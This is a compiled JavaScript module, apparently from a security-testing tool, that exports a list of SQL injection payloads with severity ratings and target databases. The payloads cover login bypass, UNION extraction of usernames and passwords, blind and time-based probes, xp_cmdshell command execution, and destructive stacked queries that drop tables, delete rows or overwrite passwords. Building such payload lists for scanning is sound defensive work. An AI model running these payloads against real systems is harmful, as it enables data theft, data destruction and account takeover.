"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.SQL_INJECTION_PAYLOADS = void 0;
exports.getSQLInjectionPayloads = getSQLInjectionPayloads;
exports.getSQLInjectionPayloadsBySeverity = getSQLInjectionPayloadsBySeverity;
exports.SQL_INJECTION_PAYLOADS = [
    {
        payload: "' OR '1'='1",
        description: "Basic SQL injection to bypass authentication",
        severity: 'critical',
    },
    {
        payload: "' OR '1'='1' --",
        description: "SQL injection with comment to ignore rest of query",
        severity: 'critical',
    },
    {
        payload: "' OR '1'='1' /*",
        description: "SQL injection with block comment",
        severity: 'critical',
    },
    {
        payload: "admin' --",
        description: "SQL injection in username field",
        severity: 'critical',
    },
    {
        payload: "' OR 1=1--",
        description: "Numeric SQL injection",
        severity: 'critical',
    },
    {
        payload: "' UNION SELECT NULL--",
        description: "UNION-based SQL injection test",
        severity: 'critical',
    },
    {
        payload: "' UNION SELECT NULL,NULL--",
        description: "UNION injection with multiple columns",
        severity: 'critical',
    },
    {
        payload: "' UNION SELECT username,password FROM users--",
        description: "UNION injection to extract data",
        severity: 'critical',
    },
    {
        payload: "' UNION SELECT 1,2,3,4,5--",
        description: "UNION injection to determine column count",
        severity: 'high',
    },
    {
        payload: "' AND 1=1--",
        description: "Boolean-based blind SQL injection (true condition)",
        severity: 'high',
    },
    {
        payload: "' AND 1=2--",
        description: "Boolean-based blind SQL injection (false condition)",
        severity: 'high',
    },
    {
        payload: "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        description: "Boolean-based blind injection to detect MySQL version",
        severity: 'high',
        database: 'mysql',
    },
    {
        payload: "'; WAITFOR DELAY '00:00:05'--",
        description: "Time-based blind SQL injection (SQL Server)",
        severity: 'high',
        database: 'mssql',
    },
    {
        payload: "' AND SLEEP(5)--",
        description: "Time-based blind SQL injection (MySQL)",
        severity: 'high',
        database: 'mysql',
    },
    {
        payload: "' AND pg_sleep(5)--",
        description: "Time-based blind SQL injection (PostgreSQL)",
        severity: 'high',
        database: 'postgresql',
    },
    {
        payload: "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        description: "Error-based SQL injection (MySQL)",
        severity: 'high',
        database: 'mysql',
    },
    {
        payload: "'; EXEC xp_cmdshell('dir')--",
        description: "SQL Server command execution",
        severity: 'critical',
        database: 'mssql',
    },
    {
        payload: "'; DROP TABLE users; --",
        description: "Stacked query to drop table",
        severity: 'critical',
    },
    {
        payload: "'; DELETE FROM users WHERE '1'='1'; --",
        description: "Stacked query to delete data",
        severity: 'critical',
    },
    {
        payload: "'; UPDATE users SET password='hacked' WHERE '1'='1'; --",
        description: "Stacked query to update data",
        severity: 'critical',
    },
    {
        payload: "'; COPY (SELECT * FROM users) TO '/tmp/users.csv'; --",
        description: "PostgreSQL COPY command injection",
        severity: 'critical',
        database: 'postgresql',
    },
    {
        payload: "'; CREATE TABLE test (data text); --",
        description: "PostgreSQL table creation injection",
        severity: 'high',
        database: 'postgresql',
    },
    {
        payload: "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||(SELECT * FROM (SELECT (SELECT CONCAT(USERNAME,CHR(58),PASSWORD) FROM ALL_USERS WHERE ROWNUM=1) FROM DUAL)||CHR(62)))) FROM DUAL) IS NULL--",
        description: "Oracle XMLType injection",
        severity: 'high',
        database: 'oracle',
    },
    {
        payload: "' || '1'='1",
        description: "String concatenation SQL injection",
        severity: 'high',
    },
    {
        payload: "1' || '1'='1",
        description: "Numeric concatenation SQL injection",
        severity: 'high',
    },
];
function getSQLInjectionPayloads(database) {
    if (!database) {
        return exports.SQL_INJECTION_PAYLOADS;
    }
    return exports.SQL_INJECTION_PAYLOADS.filter(p => !p.database || p.database.toLowerCase() === database.toLowerCase());
}
function getSQLInjectionPayloadsBySeverity(severity) {
    return exports.SQL_INJECTION_PAYLOADS.filter(p => p.severity === severity);
}
//# sourceMappingURL=sql-injection.js.map